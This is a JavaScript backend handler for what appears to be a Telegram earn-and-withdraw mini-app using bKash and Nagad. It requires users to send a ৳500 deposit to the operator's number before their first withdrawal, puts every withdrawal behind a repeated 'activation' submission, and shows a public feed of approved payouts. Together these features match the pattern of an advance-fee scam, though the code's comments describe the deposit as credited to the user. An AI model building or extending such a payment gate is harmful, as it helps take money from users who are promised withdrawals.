const { connectToDatabase } = require('./_db');
const { verifyInitData, autoApproveExpiredActivations, getActivationSettings } = require('./_utils');

// Minimum withdraw amounts (per explicit spec: both methods = 1000tk)
const MIN_WITHDRAW = { bkash: 1000, nagad: 1000 };

// ---------- ONE-TIME DEPOSIT GATE ----------
// Before a user's FIRST withdraw, they must send a one-time ৳500 deposit.
// That ৳500 is not a fee — once an admin approves it, it's credited
// straight into the user's own balance, so it becomes part of what they
// can withdraw. After their first approved deposit, hasDeposited stays
// true forever and they never see this step again.
const DEPOSIT_AMOUNT = 500;
const DEPOSIT_NUMBERS = {
  bkash: process.env.DEPOSIT_BKASH_NUMBER || '01700000000',
  nagad: process.env.DEPOSIT_NAGAD_NUMBER || '01800000000',
};

module.exports = async (req, res) => {
  try {
    const db = await connectToDatabase();

    if (req.method === 'GET') {
      const { initData, type } = req.query;
      const tgUser = verifyInitData(initData);
      if (!tgUser) return res.status(401).json({ error: 'Invalid Telegram data' });

      if (type === 'live') {
        const live = await db.collection('withdraw_requests')
          .find({ status: 'approved' })
          .sort({ approvedAt: -1 })
          .limit(15)
          .toArray();
        return res.status(200).json({
          live: live.map(w => ({
            name: maskName(w.displayName),
            method: w.method,
            amount: w.amount,
            time: w.approvedAt
          }))
        });
      }

      // ---------- Deposit info: the admin's receiving bKash/Nagad number
      // + the fixed one-time deposit amount, so the frontend never has to
      // hardcode it (can be changed anytime via env vars). ----------
      if (type === 'deposit_info') {
        const user = await db.collection('users').findOne({ telegramId: tgUser.id });
        return res.status(200).json({
          amount: DEPOSIT_AMOUNT,
          numbers: DEPOSIT_NUMBERS,
          hasDeposited: !!(user && user.hasDeposited)
        });
      }

      // ---------- This user's own deposit request history ----------
      if (type === 'deposit_history') {
        const deposits = await db.collection('deposit_requests')
          .find({ telegramId: tgUser.id })
          .sort({ createdAt: -1 })
          .limit(20)
          .toArray();
        return res.status(200).json({
          history: deposits.map(d => ({
            method: d.method,
            amount: d.amount,
            status: d.status,
            createdAt: d.createdAt
          }))
        });
      }

      // ---------- Account-activation gate status ----------
      // Triggered from the frontend only once the user actually tries to
      // withdraw at/above the minimum amount — not shown up-front. Also
      // opportunistically auto-approves any submission that's been pending
      // past the review window, so this always reflects the latest state.
      if (type === 'activation_status') {
        await autoApproveExpiredActivations(db);
        const user = await db.collection('users').findOne({ telegramId: tgUser.id });
        const pending = await db.collection('activation_requests').findOne({
          telegramId: tgUser.id,
          status: 'pending'
        });
        const settings = await getActivationSettings(db);
        return res.status(200).json({
          active: !!(user && user.accountActive),
          pending: !!pending,
          telegramUsername: tgUser.username || '',
          telegramId: tgUser.id,
          noticeText: settings.activeVariant === 'warning' ? settings.textWarning : settings.textNormal,
          copyButtonText: settings.copyButtonText,
          usernamePlaceholder: settings.usernamePlaceholder,
          tgidPlaceholder: settings.tgidPlaceholder
        });
      }

      // ---------- This user's own activation-submission history ----------
      if (type === 'activation_history') {
        const history = await db.collection('activation_requests')
          .find({ telegramId: tgUser.id })
          .sort({ createdAt: -1 })
          .limit(20)
          .toArray();
        return res.status(200).json({
          history: history.map(a => ({
            telegramUsername: a.telegramUsername,
            telegramId: a.telegramIdSubmitted,
            status: a.status,
            createdAt: a.createdAt
          }))
        });
      }

      const history = await db.collection('withdraw_requests')
        .find({ telegramId: tgUser.id })
        .sort({ createdAt: -1 })
        .limit(20)
        .toArray();
      return res.status(200).json({
        history: history.map(w => ({
          method: w.method,
          amount: w.amount,
          status: w.status,
          createdAt: w.createdAt
        }))
      });
    }

    if (req.method === 'POST') {
      const { initData, action } = req.body;
      const tgUser = verifyInitData(initData);
      if (!tgUser) return res.status(401).json({ error: 'Invalid Telegram data' });

      // ---------- Submit a one-time deposit request (pending admin review) ----------
      if (action === 'deposit') {
        const { method, senderNumber, transactionId } = req.body;
        if (!['bkash', 'nagad'].includes(method)) {
          return res.status(400).json({ error: 'invalid_method' });
        }
        const cleanSender = String(senderNumber || '').replace(/\D/g, '');
        if (cleanSender.length < 10) {
          return res.status(400).json({ error: 'invalid_sender_number' });
        }
        const cleanTxn = String(transactionId || '').trim();
        if (!cleanTxn) {
          return res.status(400).json({ error: 'invalid_transaction_id' });
        }

        const user = await db.collection('users').findOne({ telegramId: tgUser.id });
        if (user && user.hasDeposited) {
          return res.status(400).json({ error: 'already_deposited' });
        }

        // One pending deposit at a time — stops someone spamming submissions
        // for the same ৳500 payment while the first one is still in review.
        const existingPending = await db.collection('deposit_requests').findOne({
          telegramId: tgUser.id,
          status: 'pending'
        });
        if (existingPending) {
          return res.status(400).json({ error: 'already_pending' });
        }

        const displayName = user ? (user.firstName || user.username || 'User') : 'User';
        await db.collection('deposit_requests').insertOne({
          telegramId: tgUser.id,
          displayName,
          method,
          senderNumber: cleanSender,
          transactionId: cleanTxn,
          amount: DEPOSIT_AMOUNT,
          status: 'pending',
          createdAt: new Date()
        });

        return res.status(200).json({ success: true });
      }

      // ---------- Submit account-activation (withdraw security gate) ----------
      // Only reachable once the user has actually tried to withdraw at/above
      // the minimum amount (frontend gates this) — this is what puts the
      // "Please Fill Up" submission into the admin's Activations queue.
      if (action === 'activate') {
        const { telegramUsername, telegramId } = req.body;
        const cleanTgId = String(telegramId || '').replace(/\D/g, '');
        if (!cleanTgId) {
          return res.status(400).json({ error: 'invalid_telegram_id' });
        }

        const user = await db.collection('users').findOne({ telegramId: tgUser.id });
        if (user && user.accountActive) {
          return res.status(400).json({ error: 'already_active' });
        }

        const existingPending = await db.collection('activation_requests').findOne({
          telegramId: tgUser.id,
          status: 'pending'
        });
        if (existingPending) {
          return res.status(400).json({ error: 'already_pending' });
        }

        const displayName = user ? (user.firstName || user.username || 'User') : 'User';
        await db.collection('activation_requests').insertOne({
          telegramId: tgUser.id,
          displayName,
          telegramUsername: String(telegramUsername || '').replace(/^@/, '').trim(),
          telegramIdSubmitted: cleanTgId,
          status: 'pending',
          createdAt: new Date()
        });

        return res.status(200).json({ success: true });
      }

      const { method, accountNumber, amount } = req.body;

      const amt = Number(amount);
      if (!['bkash', 'nagad'].includes(method)) {
        return res.status(400).json({ error: 'invalid_method' });
      }
      if (!accountNumber || String(accountNumber).replace(/\D/g, '').length < 10) {
        return res.status(400).json({ error: 'invalid_account_number' });
      }
      if (!amt || amt < MIN_WITHDRAW[method]) {
        return res.status(400).json({ error: 'below_minimum', minimum: MIN_WITHDRAW[method] });
      }

      const user = await db.collection('users').findOne({ telegramId: tgUser.id });
      if (!user || user.balance < amt) {
        return res.status(400).json({ error: 'insufficient_balance' });
      }

      // Security gate only kicks in right here — once the user has actually
      // reached the minimum withdrawable amount and clicks withdraw. Checked
      // server-side too, not just in the UI, so it can't be bypassed by
      // calling this endpoint directly.
      await autoApproveExpiredActivations(db);
      if (!user.accountActive) {
        return res.status(400).json({ error: 'activation_required' });
      }

      await db.collection('users').updateOne(
        { telegramId: tgUser.id },
        {
          $inc: { balance: -amt },
          // Reset the security gate right after this withdraw goes through,
          // so the NEXT withdraw attempt asks for a fresh Username/UID
          // verification too — this isn't a one-time-ever unlock, it's
          // required every single time.
          $set: { accountActive: false }
        }
      );

      const displayName = user.firstName || user.username || 'User';
      await db.collection('withdraw_requests').insertOne({
        telegramId: tgUser.id,
        displayName,
        method,
        accountNumber,
        amount: amt,
        status: 'pending',
        createdAt: new Date()
      });

      return res.status(200).json({ success: true });
    }

    res.status(405).end();
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'Server error' });
  }
};

function maskName(name) {
  if (!name) return 'User***';
  return name.slice(0, 3) + '***';
}
